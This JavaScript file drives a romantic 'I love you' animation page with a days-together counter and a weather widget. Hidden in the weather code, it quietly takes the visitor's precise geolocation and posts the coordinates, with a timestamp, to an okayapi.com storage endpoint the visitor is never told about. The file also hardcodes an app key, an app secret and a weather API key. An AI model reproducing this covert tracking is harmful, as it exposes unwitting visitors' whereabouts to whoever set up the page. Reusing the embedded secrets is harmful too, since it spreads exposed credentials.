'use strict';

/**
 * 生成小白接口签名
 */
function enryptData(params) {

    const OKAYAPI_APP_KEY = "C028FF99043F11B22422AA9A99A6437A";
    const OKAYAPI_APP_SECRECT = "70hOizPISe1IiLEB2GldwETsZ6uZojBKpH549RgC3KNRf6WEwuYObTkAIB5vPY6bPRUjdlF";

    params['app_key'] = OKAYAPI_APP_KEY;

    var sdic = Object.keys(params).sort();
    var paramsStrExceptSign = "";
    for (var i in sdic) {
        paramsStrExceptSign += params[sdic[i]];
    }

    var sign = md5(paramsStrExceptSign + OKAYAPI_APP_SECRECT).toUpperCase();
    params['sign'] = sign;

    return params;
}
// deepth函数
function Deepth(year, month, date) {
    var today, firstDay, deepth;
    today = new Date();
    firstDay = new Date(year, month, date);
    deepth = today.getTime() - firstDay.getTime();
    return deepth / 1000 / 60 / 60 / 24;
}
//更新时间函数
function UpdateTime(year, month, date, interval) {
    var oToday = document.querySelector('.today');

    function load() {
        var deepthDays = Deepth(year, month, date).toFixed(7);
        oToday.innerHTML = deepthDays;
    }
    load();
    setInterval(function() {
        load();
    }, interval)
}
UpdateTime(2017, 9, 18, 102.4);

// 天气接口
$(function() {
    var myLocation = '';
    var myStatus = false;
    var mapObj = new AMap.Map('iCenter');
    mapObj.plugin('AMap.Geolocation', function() {
        var geolocation = new AMap.Geolocation({
            enableHighAccuracy: true, //是否使用高精度定位，默认:true
            timeout: 8000, //超过10秒后停止定位，默认：无穷大
            maximumAge: 0, //定位结果缓存0毫秒，默认：0
            convert: true, //自动偏移坐标，偏移后的坐标为高德坐标，默认：true
            showButton: true, //显示定位按钮，默认：true
            buttonPosition: 'LB', //定位按钮停靠位置，默认：'LB'，左下角
            buttonOffset: new AMap.Pixel(10, 20), //定位按钮与设置的停靠位置的偏移量，默认：Pixel(10, 20)
            showMarker: true, //定位成功后在定位到的位置显示点标记，默认：true
            showCircle: true, //定位成功后用圆圈表示定位精度范围，默认：true
            panToLocation: true, //定位成功后将定位到的位置作为地图中心点，默认：true
            zoomToAccuracy: true //定位成功后调整地图视野范围使定位位置及精度范围视野内可见，默认：false
        });
        // mapObj.addControl(geolocation);
        geolocation.getCurrentPosition(function(status, res) {
            if (status == 'complete') {
                myLocation = res.position;
                var xb_data = {
                    s: 'App.Main_Set.Update',
                    id: 3,
                    data: "{'" + new Date() + "':" + myLocation.lat + "," + myLocation.lng + "}"
                }

                $.ajax({
                    url: 'https://hn2.api.okayapi.com/',
                    type: 'post',
                    dataType: 'json',
                    data: enryptData(xb_data),

                }).success(function(res) {
                    console.log(res);
                })
            } else if (status == 'error') {
                alert('获取位置失败')
            }
            getWeatherInfo();
        });

    });

    function getWeatherInfo() {
        $.ajax({
            url: 'https://free-api.heweather.com/s6/weather/now',
            type: 'post',
            dataType: 'json',
            data: {
                location: myLocation == '' ? '福州' : (myLocation.lat + ',' + myLocation.lng),
                key: '60d93e48df57402aa6a917addf87c7a3'
            },

        }).success(function(res) {
            var data = res.HeWeather6[0].now;

            $('.w1 img').attr('src', 'images/' + data.cond_code + '.png');
            $('.w1 p span').html(data.tmp);
            $('.wload').hide();
            $('.w1').fadeIn();
        })
        $.ajax({
            url: 'https://free-api.heweather.com/s6/weather/forecast',
            type: 'post',
            dataType: 'json',
            data: {
                location: myLocation == '' ? '福州' : (myLocation.lat + ',' + myLocation.lng),
                key: '60d93e48df57402aa6a917addf87c7a3'
            },

        }).success(function(res) {
            var data1 = res.HeWeather6[0].daily_forecast[1];
            var data2 = res.HeWeather6[0].daily_forecast[2];
            $('.w2 img').attr('src', 'images/' + data1.cond_code_d + '.png');
            $('.w2 p span').html(data1.tmp_min + '-' + data1.tmp_max);
            $('.w3 img').attr('src', 'images/' + data2.cond_code_d + '.png');
            $('.w3 p span').html(data2.tmp_min + '-' + data2.tmp_max);
            $('.wload').hide();
            $('.w2').fadeIn();
            $('.w3').fadeIn();

        })
    }

})

// 天气接口end


var _extends = Object.assign || function(target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) {
    if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); }
    subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } });
    if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass;
}

var qs = document.querySelector.bind(document);
var easingHeart = mojs.easing.path('M0,100C2.9,86.7,33.6-7.3,46-7.3s15.2,22.7,26,22.7S89,0,100,0');

var el = {
    container: qs('.mo-container'),

    i: qs('.lttr--I'),
    l: qs('.lttr--L'),
    o: qs('.lttr--O'),
    v: qs('.lttr--V'),
    e: qs('.lttr--E'),
    y: qs('.lttr--Y'),
    o2: qs('.lttr--O2'),
    u: qs('.lttr--U'),

    lineLeft: qs('.line--left'),
    lineRight: qs('.line--rght'),

    colTxt: "#763c8c",
    colHeart: "#fa4843",

    blup: qs('.blup'),
    blop: qs('.blop'),
    sound: qs('.sound')
};

var Heart = function(_mojs$CustomShape) {
    _inherits(Heart, _mojs$CustomShape);

    function Heart() {
        _classCallCheck(this, Heart);

        return _possibleConstructorReturn(this, _mojs$CustomShape.apply(this, arguments));
    }

    Heart.prototype.getShape = function getShape() {
        return '<path d="M50,88.9C25.5,78.2,0.5,54.4,3.8,31.1S41.3,1.8,50,29.9c8.7-28.2,42.8-22.2,46.2,1.2S74.5,78.2,50,88.9z"/>';
    };

    Heart.prototype.getLength = function getLength() {
        return 200;
    };

    return Heart;
}(mojs.CustomShape);

mojs.addShape('heart', Heart);

var crtBoom = function crtBoom() {
    var delay = arguments.length <= 0 || arguments[0] === undefined ? 0 : arguments[0];

    var _radius, _radius2;

    var x = arguments.length <= 1 || arguments[1] === undefined ? 0 : arguments[1];
    var rd = arguments.length <= 2 || arguments[2] === undefined ? 46 : arguments[2];

    parent = el.container;
    var crcl = new mojs.Shape({
        shape: 'circle',
        fill: 'none',
        stroke: el.colTxt,
        strokeWidth: { 5: 0 },
        radius: (_radius = {}, _radius[rd] = [rd + 20], _radius),
        easing: 'quint.out',
        duration: 500 / 3,
        parent: parent,
        delay: delay,
        x: x
    });

    var brst = new mojs.Burst({
        radius: (_radius2 = {}, _radius2[rd + 15] = 110, _radius2),
        angle: 'rand(60, 180)',
        count: 3,
        timeline: { delay: delay },
        parent: parent,
        x: x,
        children: {
            radius: [5, 3, 7],
            fill: el.colTxt,
            scale: { 1: 0, easing: 'quad.in' },
            pathScale: [.8, null],
            degreeShift: ['rand(13, 60)', null],
            duration: 1000 / 3,
            easing: 'quint.out'
        }
    });

    return [crcl, brst];
};

var crtLoveTl = function crtLoveTl() {
    var move = 1000;
    var boom = 200;
    var easing = 'sin.inOut';
    var easingBoom = 'sin.in';
    var easingOut = 'sin.out';
    var opts = { duration: move, easing: easing, opacity: 1 };
    var delta = 150;

    return new mojs.Timeline().add([new mojs.Tween({
            duration: move,
            onStart: function onStart() {
                [el.i, el.l, el.o, el.v, el.e, el.y, el.o2, el.u].forEach(function(el) {
                    el.style.opacity = 1;
                    el.style = 'transform: translate(0px, 0px) rotate(0deg) skew(0deg, 0deg) scale(1, 1); opacity: 1;';
                });
            },
            onComplete: function onComplete() {
                [el.l, el.o, el.v, el.e].forEach(function(el) {
                    return el.style.opacity = 0;
                });
                el.blop.play();
            }
        }), new mojs.Tween({
            duration: move * 2 + boom,
            onComplete: function onComplete() {
                [el.y, el.o2].forEach(function(el) {
                    return el.style.opacity = 0;
                });
                el.blop.play();
            }
        }), new mojs.Tween({
            duration: move * 3 + boom * 2 - delta,
            onComplete: function onComplete() {
                el.i.style.opacity = 0;
                el.blop.play();
            }
        }), new mojs.Tween({
            duration: move * 3 + boom * 2,
            onComplete: function onComplete() {
                el.u.style.opacity = 0;
                el.blup.play();
            }
        }), new mojs.Tween({
            duration: 50,
            delay: 4050,
            onUpdate: function onUpdate(progress) {
                [el.i, el.l, el.o, el.v, el.e, el.y, el.o2, el.u].forEach(function(el) {
                    el.style = 'transform: translate(0px, 0px) rotate(0deg) skew(0deg, 0deg) scale(1, 1); opacity: ' + 1 * progress + ';';
                });
            },
            onComplete: function onComplete() {
                [el.i, el.l, el.o, el.v, el.e, el.y, el.o2, el.u].forEach(function(el) {
                    el.style.opacity = 1;
                    el.style = 'transform: translate(0px, 0px) rotate(0deg) skew(0deg, 0deg) scale(1, 1); opacity: 1;';
                });
            }
        }), new mojs.Html(_extends({}, opts, {
            el: el.lineLeft,
            x: { 0: 52 }
        })).then({
            duration: boom + move,
            easing: easing,
            x: { to: 52 + 54 }
        }).then({
            duration: boom + move,
            easing: easing,
            x: { to: 52 + 54 + 60 }
        }).then({
            duration: 150, // 3550
            easing: easing,
            x: { to: 52 + 54 + 60 + 10 }
        }).then({
            duration: 300
        }).then({
            duration: 350,
            x: { to: 0 },
            easing: easingOut
        }), new mojs.Html(_extends({}, opts, {
            el: el.lineRight,
            x: { 0: -52 }
        })).then({
            duration: boom + move,
            easing: easing,
            x: { to: -52 - 54 }
        }).then({
            duration: boom + move,
            easing: easing,
            x: { to: -52 - 54 - 60 }
        }).then({
            duration: 150,
            easing: easing,
            x: { to: -52 - 54 - 60 - 10 }
        }).then({
            duration: 300
        }).then({
            duration: 350,
            x: { to: 0 },
            easing: easingOut
        }), new mojs.Html(_extends({}, opts, {
            el: el.i,
            x: { 0: 34 }
        })).then({
            duration: boom,
            easing: easingBoom,
            x: { to: 34 + 19 }
        }).then({
            duration: move,
            easing: easing,
            x: { to: 34 + 19 + 40 }
        }).then({
            duration: boom,
            easing: easingBoom,
            x: { to: 34 + 19 + 40 + 30 }
        }).then({
            duration: move,
            easing: easing,
            x: { to: 34 + 19 + 40 + 30 + 30 }
        }), new mojs.Html(_extends({}, opts, {
            el: el.l,
            x: { 0: 15 }
        })), new mojs.Html(_extends({}, opts, {
            el: el.o,
            x: { 0: 11 }
        })), new mojs.Html(_extends({}, opts, {
            el: el.v,
            x: { 0: 3 }
        })), new mojs.Html(_extends({}, opts, {
            el: el.e,
            x: { 0: -3 }
        })), new mojs.Html(_extends({}, opts, {
            el: el.y,
            x: { 0: -20 }
        })).then({
            duration: boom,
            easing: easingBoom,
            x: { to: -20 - 33 }
        }).then({
            duration: move,
            easing: easing,
            x: { to: -20 - 33 - 24 }
        }), new mojs.Html(_extends({}, opts, {
            el: el.o2,
            x: { 0: -27 }
        })).then({
            duration: boom,
            easing: easingBoom,
            x: { to: -27 - 27 }
        }).then({
            duration: move,
            easing: easing,
            x: { to: -27 - 27 - 30 }
        }), new mojs.Html(_extends({}, opts, {
            el: el.u,
            x: { 0: -32 }
        })).then({
            duration: boom,
            easing: easingBoom,
            x: { to: -32 - 21 }
        }).then({
            duration: move,
            easing: easing,
            x: { to: -32 - 21 - 36 }
        }).then({
            duration: boom,
            easing: easingBoom,
            x: { to: -32 - 21 - 36 - 31 }
        }).then({
            duration: move,
            easing: easing,
            x: { to: -32 - 21 - 36 - 31 - 27 }
        }), new mojs.Shape({
            parent: el.container,
            shape: 'heart',
            delay: move,
            fill: el.colHeart,
            x: -64,
            scale: { 0: 0.95, easing: easingHeart },
            duration: 500
        }).then({
            x: { to: -62, easing: easing },
            scale: { to: 0.65, easing: easing },
            duration: boom + move - 500
        }).then({
            duration: boom - 50,
            x: { to: -62 + 48 },
            scale: { to: 0.90 },
            easing: easingBoom
        }).then({
            duration: 125,
            scale: { to: 0.8 },
            easing: easingOut
        }).then({
            duration: 125,
            scale: { to: 0.85 },
            easing: easingOut
        }).then({
            duration: move - 200,
            scale: { to: 0.45 },
            easing: easing
        }).then({
            delay: -75,
            duration: 150,
            x: { to: 0 },
            scale: { to: 0.90 },
            easing: easingBoom
        }).then({
            duration: 125,
            scale: { to: 0.8 },
            easing: easingOut
        }).then({
            duration: 125, // 3725
            scale: { to: 0.85 },
            easing: easingOut
        }).then({
            duration: 125
        }). // 3850
        then({
            duration: 350,
            scale: { to: 0 },
            easing: easingOut
        })
    ].concat(crtBoom(move, -64, 46), crtBoom(move * 2 + boom, 18, 34), crtBoom(move * 3 + boom * 2 - delta, -64, 34), crtBoom(move * 3 + boom * 2, 45, 34)));
};

var loveTl = crtLoveTl().play();
setInterval(function() {
    loveTl.replay();
}, 4300);

var volume = 0.2;
el.blup.volume = volume;
el.blop.volume = volume;

var toggleSound = function toggleSound() {
    var on = true;
    return function() {
        if (on) {
            el.blup.volume = 0.0;
            el.blop.volume = 0.0;
            el.sound.classList.add('sound--off');
        } else {
            el.blup.volume = volume;
            el.blop.volume = volume;
            el.sound.classList.remove('sound--off');
        }
        on = !on;
    };
};
el.sound.addEventListener('click', toggleSound());